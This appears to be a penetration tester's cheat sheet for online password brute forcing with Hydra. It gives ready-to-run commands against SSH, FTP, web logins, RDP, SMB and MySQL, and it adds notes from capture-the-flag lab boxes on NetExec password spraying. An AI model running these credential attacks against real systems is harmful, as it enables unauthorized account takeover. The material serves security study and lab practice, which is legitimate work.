# Hydra (Online Brute Force)

---

## SSH
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://$IP
# Multiple users:
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://$IP
```

## FTP
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://$IP
```

## HTTP POST login
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/login:REDACTED=^USER^&password=^PASS^:Invalid credentials"
```

## HTTP Basic Auth
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-get /admin
```

## RDP
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt rdp://$IP
```

## SMB
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://$IP
```

## MySQL
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://$IP
```

---

## Tips

- Use `-t 4` for services that are rate-limited (SSH default)
- Use `-f` to stop after first valid password found
- Use `-V` for verbose output
- Always check for account lockout policies before brute forcing

See also: [[Hashcat]] and [[John]] for offline hash cracking.

## From Your Boxes

> **Nagoya** (PG/Windows) - NXC (NetExec) SMB brute force with username list against AD domain
> - What worked: `nxc smb TARGET_IP -u names.txt -p REDACTED found `Fiona.Clark:REDACTED`
> - Lesson: For AD environments, NXC/CrackMapExec is often better than hydra for SMB/WinRM brute force. Enumerate usernames from web pages first

> **ServMon** (HTB) - NXC password spraying with found password list against multiple users
> - What worked: `nxc smb TARGET_IP -u users.txt -p REDACTED --continue-on-success` found `nadine:REDACTED`
> - Lesson: When you find a password list (e.g., from FTP, directory traversal), spray it against all known users. Use `--continue-on-success` to find all valid combos

> **Course Materials - HTTP POST** - Hydra against web login forms
> - What worked: `hydra -l user -P /usr/share/wordlists/rockyou.txt TARGET_IP http-post-form "/index.php:REDACTED=user&fm_pwd=^PASS^:Login failed. Invalid"`
> - Lesson: The failure string must be unique text from a FAILED login response. Check the login page source or intercept with Burp first

> **Course Materials - SSH & RDP** - Hydra for SSH brute force and RDP password spraying
> - What worked: `hydra -l USERNAME -P /usr/share/wordlists/rockyou.txt -s PORT ssh://HOST` for SSH, `hydra -L users.txt -p "PASSWORD" rdp://HOST` for RDP spray
> - Lesson: Use `-s` flag to specify non-standard SSH ports (like Sunday's port 22022). For spraying, `-L` for user list + `-p` for single password
